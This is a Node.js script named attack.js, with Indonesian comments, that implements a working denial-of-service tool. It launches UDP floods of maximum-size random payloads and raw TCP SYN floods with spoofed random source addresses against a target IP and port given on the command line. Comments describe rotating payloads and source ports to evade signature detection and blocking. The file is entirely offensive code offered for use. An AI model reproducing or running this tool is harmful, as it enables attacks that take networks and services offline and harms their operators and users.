const dgram = require('dgram');
const crypto = require('crypto');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const method = process.argv[6];

if (!target || !port || !duration || !threads || !method) {
    console.log('Usage: node attack.js <ip> <port> <time> <thread> <udp|tcp-raw>');
    process.exit(1);
}

const hostname = os.hostname();
let sent = 0;
let start = Date.now();

// ========== UDP SUPER GACOR ==========
if (method === 'udp') {
    // Payload MAXIMUM (65500 bytes) biar cepet abisin bandwidth target
    const payload = crypto.randomBytes(65500);
    
    // Multiple payload buat bypass signature detection
    const payloads = [
        crypto.randomBytes(65500),
        crypto.randomBytes(65500),
        crypto.randomBytes(65500),
        crypto.randomBytes(65500),
        crypto.randomBytes(65500)
    ];
    
    let payloadIndex = 0;
    
    for(let i = 0; i < threads; i++) {
        const sock = dgram.createSocket('udp4');
        sock.on('error', () => {});
        
        // Random source port biar susah di-block
        try { 
            sock.bind(Math.floor(Math.random() * 60000) + 1024); 
        } catch(e) {}
        
        const send = () => {
            // Rotate payload biar ga ketauan pattern
            const currentPayload = payloads[payloadIndex % payloads.length];
            payloadIndex++;
            
            sock.send(currentPayload, port, target, (err) => {
                if (!err) {
                    sent++;
                    setImmediate(send);
                } else {
                    sock.close();
                    setTimeout(() => {
                        const newSock = dgram.createSocket('udp4');
                        newSock.on('error', () => {});
                        try { newSock.bind(Math.floor(Math.random() * 60000) + 1024); } catch(e) {}
                        send();
                    }, 1);
                }
            });
        };
        
        send();
    }
    
    // Monitor tiap detik
    const monitor = setInterval(() => {
        const elapsed = (Date.now() - start) / 1000;
        const pps = sent / elapsed;
        const mbps = (sent * 65500 * 8) / elapsed / 1024 / 1024;
        console.log(`[${hostname}] 🔥 UDP: ${pps.toFixed(0)} PPS | ${mbps.toFixed(2)} Mbps | Total: ${sent.toLocaleString()}`);
    }, 1000);
    
    setTimeout(() => {
        clearInterval(monitor);
        const elapsed = (Date.now() - start) / 1000;
        const avgPps = sent / elapsed;
        const avgMbps = (sent * 65500 * 8) / elapsed / 1024 / 1024;
        console.log(`[${hostname}] ✅ UDP FINISHED | ${sent.toLocaleString()} packets | ${avgPps.toFixed(0)} avg PPS | ${avgMbps.toFixed(2)} avg Mbps`);
        process.exit(0);
    }, duration * 1000);
}

// ========== TCP-RAW GACOR ==========
else if (method === 'tcp-raw') {
    let raw;
    try {
        raw = require('raw-socket');
    } catch(e) {
        console.log(`[${hostname}] raw-socket not installed!`);
        process.exit(1);
    }
    
    const dstIp = target.split('.').map(Number);
    let totalSent = 0;
    
    function randomIp() {
        return [
            Math.floor(Math.random() * 255),
            Math.floor(Math.random() * 255),
            Math.floor(Math.random() * 255),
            Math.floor(Math.random() * 255)
        ];
    }
    
    function checksum(buf) {
        let sum = 0;
        for(let i = 0; i < buf.length; i += 2) {
            sum += (buf[i] << 8) + (buf[i + 1] || 0);
            if(sum > 0xffff) sum = (sum & 0xffff) + (sum >>> 16);
        }
        while(sum > 0xffff) sum = (sum & 0xffff) + (sum >>> 16);
        return ~sum & 0xffff;
    }
    
    function createSynPacket(srcIp, srcPort, seq) {
        const ip = Buffer.alloc(20);
        ip[0] = 0x45;
        ip.writeUInt16BE(40, 2);
        ip.writeUInt16BE(Math.floor(Math.random() * 65535), 4);
        ip.writeUInt16BE(0x4000, 6);
        ip[8] = 255;
        ip[9] = 6;
        ip[12] = srcIp[0]; ip[13] = srcIp[1]; ip[14] = srcIp[2]; ip[15] = srcIp[3];
        ip[16] = dstIp[0]; ip[17] = dstIp[1]; ip[18] = dstIp[2]; ip[19] = dstIp[3];
        
        let ipSum = 0;
        for(let i = 0; i < 20; i += 2) ipSum += ip.readUInt16BE(i);
        while(ipSum > 0xffff) ipSum = (ipSum & 0xffff) + (ipSum >>> 16);
        ip.writeUInt16BE(~ipSum & 0xffff, 10);
        
        const tcp = Buffer.alloc(20);
        tcp.writeUInt16BE(srcPort, 0);
        tcp.writeUInt16BE(port, 2);
        tcp.writeUInt32BE(seq, 4);
        tcp.writeUInt32BE(0, 8);
        tcp[12] = 0x50;
        tcp[13] = 0x02;
        tcp.writeUInt16BE(65535, 14);
        tcp.writeUInt16BE(0, 16);
        tcp.writeUInt16BE(0, 18);
        
        const pseudo = Buffer.alloc(12);
        pseudo[0] = srcIp[0]; pseudo[1] = srcIp[1]; pseudo[2] = srcIp[2]; pseudo[3] = srcIp[3];
        pseudo[4] = dstIp[0]; pseudo[5] = dstIp[1]; pseudo[6] = dstIp[2]; pseudo[7] = dstIp[3];
        pseudo[8] = 0; pseudo[9] = 6;
        pseudo.writeUInt16BE(20, 10);
        
        let tcpSum = 0;
        for(let i = 0; i < 12; i += 2) tcpSum += pseudo.readUInt16BE(i);
        for(let i = 0; i < 20; i += 2) tcpSum += tcp.readUInt16BE(i);
        while(tcpSum > 0xffff) tcpSum = (tcpSum & 0xffff) + (tcpSum >>> 16);
        tcp.writeUInt16BE(~tcpSum & 0xffff, 16);
        
        return Buffer.concat([ip, tcp]);
    }
    
    // SUPER GACOR: 5 socket per thread
    const socketsPerThread = 5;
    const totalSockets = threads * socketsPerThread;
    
    console.log(`[${hostname}] 🔥 TCP-RAW starting: ${threads} threads x ${socketsPerThread} sockets = ${totalSockets} sockets`);
    
    for(let i = 0; i < threads; i++) {
        for(let s = 0; s < socketsPerThread; s++) {
            const socket = raw.createSocket({ protocol: raw.Protocol.TCP });
            socket.on('error', () => {});
            
            let srcPort = Math.floor(Math.random() * 64511) + 1024;
            let seq = Math.floor(Math.random() * 0xffffffff);
            
            const send = () => {
                const srcIp = randomIp();
                const packet = createSynPacket(srcIp, srcPort, seq);
                
                socket.send(packet, 0, packet.length, target, (err) => {
                    if (!err) totalSent++;
                });
                
                srcPort = (srcPort + 1) % 65535;
                if(srcPort < 1024) srcPort = 1024;
                seq = (seq + 1000) >>> 0;
                
                setImmediate(send);
            };
            
            send();
        }
    }
    
    const monitor = setInterval(() => {
        const elapsed = (Date.now() - start) / 1000;
        const pps = totalSent / elapsed;
        console.log(`[${hostname}] 🔥 TCP-RAW: ${pps.toFixed(0)} SYN/s | Total: ${totalSent.toLocaleString()}`);
    }, 1000);
    
    setTimeout(() => {
        clearInterval(monitor);
        const elapsed = (Date.now() - start) / 1000;
        console.log(`[${hostname}] ✅ TCP-RAW FINISHED | ${totalSent.toLocaleString()} SYN packets | ${(totalSent/elapsed).toFixed(0)} avg PPS`);
        process.exit(0);
    }, duration * 1000);
}

else {
    console.log(`[${hostname}] Method ${method} not supported!`);
    process.exit(1);
}
